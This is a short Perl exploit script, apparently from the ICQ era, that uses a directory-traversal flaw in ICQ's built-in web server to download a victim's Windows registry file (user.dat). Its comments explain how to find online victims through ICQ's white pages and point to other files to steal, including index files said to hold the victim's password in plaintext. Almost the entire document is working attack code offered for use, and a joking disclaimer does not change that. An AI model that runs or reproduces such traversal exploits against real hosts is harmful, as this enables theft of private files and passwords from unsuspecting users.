#!/usr/bin/perl

#
# coded, (i.e. slapped together in a lazy-ass way) by Dr. Labrat
#

# Disclamer: If you use this to F*ck someone up, you are a bad, bad person. It wasn't me.
# You are on your own.

#Use this to be a nosey git on the net....
#defaults to getting the windoze registry from a luser running ICQ's lame webserver
#
#Use www.icq.com to browse for people that are online i.e. use the whitepages, and look for little green houses.....
#
#Then pass the IP address of the victim on the commandline
#
#change the $url var to point to any other known file.
#change $dest to point to the fliename you want it saved to.
#the url is relative to the ICQ directory, i.e. ".." is up one directory...
#
#other interesting urls to try are "......../db/UIN.idx"
#where UIN is the victim's UIN#
#
#even better (but rare) is:
#
# "......../NewDB/UIN.idx" 
#
# which contains the victim's password in PLAINTEXT after the string 
# "iUserSound"

#thanx to Shadow51
#and Delta

# Thought for the day: Using this makes you a script-kiddie.

$ipaddr=$ARGV[0];
$iaddr= gethostbyname("$ipaddr");

$url = "/.html/......../windows/user.dat";
$dest = "user.dat";

use IO::Socket;
use IO::Handle;

$port = 80;


$proto = getprotobyname("tcp");
$paddr = sockaddr_in($port, $iaddr);


print "Lame ICQ webserver filegetter, by Dr. Labrat\n";


socket(DATA, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
connect(DATA, $paddr) or die "Connect error: $!";
autoflush DATA 1;

print "Connected to $ipaddr...\n";
print "Trying to get: $url\n";

print DATA "GET $url HTTP/1.0\r\n\r\n\r\n";

@data=<DATA>;

print "\n$data[0]\n";

if ( $data[0]=~/OK/){
	print "Got $url OK\nWriting to $dest\n";
} else {
	die "Could not get $url\n"
}

open (DEST, ">$dest");
$counter=0;
foreach $chunk (@data) {
	$counter++;
	if ( $chunk=~/Content-type/) {
	print "skipping header\n";
	$counter++;
	$counter++;
	last;
	}
}

while ($counter){

	shift(@data);
	$counter--;
}

print DEST @data;	

print "Done....\n";

close DATA;
close DEST;
